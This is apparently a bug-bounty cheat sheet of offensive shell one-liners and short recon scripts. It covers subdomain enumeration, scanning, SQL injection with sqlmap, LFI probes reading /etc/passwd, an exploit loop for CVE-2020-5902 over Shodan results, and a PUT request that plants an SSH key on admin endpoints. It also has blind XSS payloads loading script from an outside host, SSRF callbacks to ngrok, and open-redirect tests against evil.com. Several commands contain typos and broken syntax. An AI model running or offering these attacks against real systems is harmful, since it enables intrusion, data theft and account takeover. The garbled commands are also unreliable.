Nuclei Command
~ > nuclei -a ransomsec -target /tmp/dangerous-shell.sh
~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml
~ > cat js_final.txt | nuclei -t /tmp/FindBug/token/secret-token-expose.yaml -o token-expose.txt
~ > chaos -d hackerone.com -silent | dnsprobe -silent -f domain| httprobe -prefer-https | nuclei -t nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml

# Extract Cloudflare Protected hosts from nuclei output
~ > cat nuclei_results.txt | grep ":cloudflare" | awk '{print $(NF)}' | sed -E 's/^\s*.*:\/\///g' | sed 's/\///'g | sort -u > cloudflare_hosts.txt

#Uncover Command
~ > echo jira | uncover -e shodan,fofa,censys -v

FFUF Command
~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
~ > ffuf -c -w HOST:hosts.txt -w ~/wordlist/words.txt -u HOST/FUZZ -mc 200 
~ > ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -x PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000;' -d '{"ssh-public-key1" "h4x0r"}' -mr "SSH" -r -x http://127.0.0.1:8080

Ghauri Command
~ > ghauri -r sqli-req.txt --dbms=MySQL --technique=T --current-db

SQLMAP Command
~ > sqlmap -r sqli-req.txt --current-db --technique=T --dbms=MySQL --level=2 --risk=3 --random-agent --no-cast

HTTPX Command
~ > cat domains.txt | httpx -path wordlist.txt -fc 400,403,404
# get overview of domains
~ > cat subdomains.txt | httpx -title -td -sc -server

# Noobtip Find Subdomains via @owasp amass and performa quick scan of all discovered subdomains via NMAP.
~ > amass db -show -d TARGET 2>/dev/null | grep TARGET | while read HOST; do nmap -sC -v -Pn $HOST; done

Local File Inclusion : by @dwisiswant0
~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -C 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Waybackurls command
~ > waybackurls example.com | grep -a -i \=http | bhedak ' http://evil.com' | while read host do; do curl -s 
-L $ host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done

# Search JS using Gau + grep
~ > gau -subs DOMAIN | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js-output.txt

# IDOR Command
~ > cat urls.txt | grep "id=[\d]*" | tee idor.txt

# Recon Tools Example
~ > cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; 
~ > katana -list hosts.txt -nc -silent -c 50 | nuclei -t <your templates>

# Automatic One Liner SSRF: 
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | nuclei -t nuclei-templates/vulnerabilities/microstrategy-ssrf.yaml

# Manual testing SSRF
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | parallel -j curl --proxy http://127.0.0.1:8080 -sk 2>/dev/null

Then use burp callobrator to manipulate SSRF

# SSRF TIP:
# Collect .js files
~ > subfinder -d <domain> -silent -all | httpx | getJS -complete | tee -a <domain>.js

# Collect Endpoints 
~ > cat <domain>.js | linkJs -m endpoints | tee -a endpoints.txt

# Construct a wordlist
~ > ./wordlistgen endpoints.txt parameters.txt | tee -a wordlist

# Should be in the format
~ > /endpoint/?url=FUZZ 
# Run FFUF against the domain and wordlist

# Findomain Command
~ > findomain -qt hackerone.com | unimap --fast-scan --stdin --url-output | fhc

# Bash one liner to take screenshot of web services running
~ > IP="192.168.0"; for p in '80' '443'; do for i in $(seq 0 5); do TAKE_SS=$(cutycapt --url=$IP.$i:$p --out=$IP.$i:$p.png); done; done

# Recon another way
~ > subfinder -d target.com -silent | httpx -silent -o urls.txt
~ > subfinder -silent -d spotify.com | zdns A | jq '.[].answers?[]?' | jq -r 'select(.type == "A") | [.name, .answer] | @csv' | tee resolvers.txt
~ > subfinder -d vulrweb.com -all -silent | httpx -silent| katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
~ > subfinder -d ups.com -all -silent | httpx -threads 100 -silent | csprecon -d ups.com -s | anew old_domains.txt
~ > subfinder -d disney.com -silent -all | httpx -silent -o disney_httpx.txt for i in$(cat disney_httpx.txt); do DOMAIN=$(echo $i | unfurl format %d); ffuf -u $i/FUZZ -w common-api-endpoints.txt -o ${DOMAIN}_ffuf.txt; done

# Find Subdomains TakeOver
~ > subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack-w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;

# get all target URLs
~ > subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg, ico,woff,woff2,gif | tee -a urls
# filter potential SQLi url
cat urls | gf sqli | tee -a sqli
# run SQLi test
while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli

# AMASS Command
~ > amass enum -norecursive -passive --config /amass/examples/config.ini -d example.com

# naabu command
~ > naabu -l target.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent
~ > echo hackerone.com | naabu -silent | bash naabu2nmap.sh
~ > time chaos -d hackerone.com -silent | naabu -ports full -silent | httpx

# Recon
~ > cat web-server.txt | aquatone -silent -http-timeout 5000 -out aquatone-screenshots -scan-timeout 1000 -resolution "1600x1200" -screenshot-timeout 10000

# Recon 
~ > cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443,8090,9090 -random-agent -silent | katana -ef css,js | \
while read testing_sqli;do sqlmap -u "$testing_sqli" \
--force-ssl -v 5\
--parse-errors \
--current-db --batch \
--random-agent --threads = 5 \
--risk=3 --level=5 --invalid-string \
--invalid-logical --invalid-bignum \
--tamper=unionalltounion \
; done

# URLs only, exclude urlscan.io
~ > python3 waymore.py -i ups.com -f --from-date 2010 -mode U --no-subs -xus

# download responses only
~ > python3 waymore.py -i ups.com -f --from-date 2010 -node R --timeout 45

# get Subdomains form Bufferover.run
~ > curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

# Extracts Juicy Information
~ > for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g' | sort -u | tee -a OUT.txt ;done

# Get subdomain form Riddler.io
~ > curl -s "https://riddler.io/search/exportcsv?q=pld:host" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

# Get subdomain from Archive
~ > curl -s "http://web.archive.org/cdx/search/cdx? url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

# Get subdomain from crt.sh
~ > curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Dump In-scope Assets from chaos-bugt
~ > curl -sl https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

# Search Subdomain using Gospider
~ > gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew

# list of resolvers
~ > dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o dns-resolvers.txt

# resolve subdomains
~ > puredns resolve subdomains.txt -r dns-resolvers.txt -w resolved.txt

# URL Extraction
~ > gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
~ > cat websites.txt | gau -subs
~ > cat websites.txt | waybackurls
~ > github-endpoints -q -k -d united.com -t tokens_github.txt
~ > cat webs.txt | roboxtractor -m 1 -wb

# find .git/HEAD
~ > curl -s "https://crt.sh/?q=%.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | https -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew

# check .git/HEAD
~ > wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301.302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew

# find XSS - Single Target
~ > gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt

# find XSS - Multiple Target
~ > gospider -s urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt
 
# find XSS 
~ > hakrawler -url "$(1)" -plain -usewayback -wayback | grep "$(1)" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-}*" | dalfox pipe -b https://your.xss.ht

# BXSS - Bling XSS in Parameters
~ > subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload <script src=https://hacker.xss.ht></script>" -parameters

# Blind XSS in X-Forwarded for Header
~ > subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"

# XSS using gf with single target
~ > echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew

# XSS httpx
~ > httpx -l master.txt -silent -no-color -threads 100 -location 301,302 | awk '(print $2)' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svgonload=alert(1)>"

# XSS from javascript hidden params
~ > assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's, 'var', '"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"

# SQL Injection Oneliner
~ > findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1

# CF-CHECK usuage you don't need to do a port scan. If it's proven that the IP is owned by cloudflare
~ > echo "ubser.com" | cf-check
~ > subfinder -silent -d uber.com| filter-resolved | cf-check | sort -u | naabu --silent | httprobe

# XSS Oneliner ---> katana + Dalfox 
~ > echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav

# Local file location
~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Open Redirect
~ > export LHOST="URL" ; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -p 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

~ > cat urls.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/nukk

# Prototype Pollution
~ > subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'windows.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

# CVE 2020-5902
~ > shodan search http.favicon.hash:-335242539 "39993" --fields ip_str,port --separator " " | awk '{print &1":"&2}' | while read host do ; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;032mNot Vulnerable\n";done

# find javascript files
~ > assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_}+" |sed -e 's, 'var', '"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

# Extract Endpoints from javascripts
~ > cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]"\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

# Get CIDR & Org Information from Target List
~ > for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST + short); do whois $ip | grep -e "CIDR\|Organizaton" | tr -s " " | paste - -; d one | uniq);done

# using gau
~ > cat subdomains.txt | gau | grep -iE '\.js $' | anew js-urls.txt

# using waybackurls
~ > cat subdomains.txt | waybackurls | grep -ie '\.js$' | anew js-urls.txt

# Endpoints
~ > katana -u https://disney.com -js-crawl -d S -hl -field endpoint | anew endpoints.txt

# gau
~ > gau video.uber.com | python3 ssrf.py dcb39ac17f1f.ngrok.io


# Javascript recon when target is using Graphql
# find all embedded graphql queries/mutations using bash one liner

~ > cat jsfile.js | nestle -regex '(query|mutation)\s+[a-zA-Z]+[0-9]*[a-zA-Z]+(\([^(\(|\))]+\))*\s*[{:nested:}]' | sed 's/\\n/\n/g'

# create a list of resolvers
~ > dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -0 dns-resolvers.txt

# resolve subdomains
~ > puredns resolve subdomains.txt -r dns-resolvers.txt -w resolved.txt

# Gather Domainns from Content-Security-Policy
~ > curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -E0 "[a-zA-Z0-9./?=_-]*" | sed -e '/\./!d' -e '/[^3A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u


~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml

-------------------------------------------------------------------------------------
# ReconOne # 1

#!/bin/bash
# $1 => example.domain

amass enum --passive -d $1 -o domains_$1
assetfinder --subs-only $1 | tee -a domains_$1

subfinder -d $1 -o domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domain_$1

# filtering the domains
sort -u domains_$1 -o domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1 | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
----------------------------------------------------------------------------------------

---------------------------------------------------------------------------------------
# ReconTwo # 2

gauq() {
  gau $1 -subs | \
  grep "=" | \
  cgrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
  qsreplace -a
}

sqliz() {
  gauq $1 | python3 $HOME/Tools/DSSS/dsss.py
}

bxss() {
  BLIND="https://your.xss.ht"
  gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
  dalfox pipe -b $BLIND
}

cat target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht

--------------------------------------------------------------------------------------------



